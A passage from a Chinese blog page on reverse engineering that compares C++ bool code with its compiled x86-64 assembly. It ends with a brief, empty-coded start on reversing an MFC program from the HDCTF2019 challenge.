<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.LC0:</span><br><span class="line">        .string &quot;%d\n&quot;</span><br><span class="line">main:</span><br><span class="line">        push    rbp</span><br><span class="line">        mov     rbp, rsp</span><br><span class="line">        sub     rsp, 16</span><br><span class="line">        mov     BYTE PTR [rbp-1], 1</span><br><span class="line">        mov     BYTE PTR [rbp-2], 1</span><br><span class="line">        movzx   eax, BYTE PTR [rbp-1]</span><br><span class="line">        cmp     al, BYTE PTR [rbp-2]</span><br><span class="line">        sete    al</span><br><span class="line">        movzx   eax, al</span><br><span class="line">        mov     esi, eax</span><br><span class="line">        mov     edi, OFFSET FLAT:.LC0</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        call    printf</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        leave</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
<p>可以看到，编译器是通过cmp,setne命令组合赋值的</p>
<p>那如果是变量赋值呢</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> a=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> b=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">bool</span> c=b;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,a==c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.LC0:</span><br><span class="line">        .string &quot;%d\n&quot;</span><br><span class="line">main:</span><br><span class="line">        push    rbp</span><br><span class="line">        mov     rbp, rsp</span><br><span class="line">        sub     rsp, 16</span><br><span class="line">        mov     BYTE PTR [rbp-1], 1</span><br><span class="line">        mov     DWORD PTR [rbp-8], 2</span><br><span class="line">        cmp     DWORD PTR [rbp-8], 0</span><br><span class="line">        setne   al</span><br><span class="line">        mov     BYTE PTR [rbp-9], al</span><br><span class="line">        movzx   eax, BYTE PTR [rbp-1]</span><br><span class="line">        cmp     al, BYTE PTR [rbp-9]</span><br><span class="line">        sete    al</span><br><span class="line">        movzx   eax, al</span><br><span class="line">        mov     esi, eax</span><br><span class="line">        mov     edi, OFFSET FLAT:.LC0</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        call    printf</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        leave</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
<h2 id="MFC程序逆向"><a href="#MFC程序逆向" class="headerlink" title="MFC程序逆向"></a>MFC程序逆向</h2><p>出自[HDCTF2019]MFC</p>
<p>可以使用xspy查看程序收到消息的函数，发送消息需要先找到窗体再发送消息</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/2/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/">Next &amp;raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2020 John Doe
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>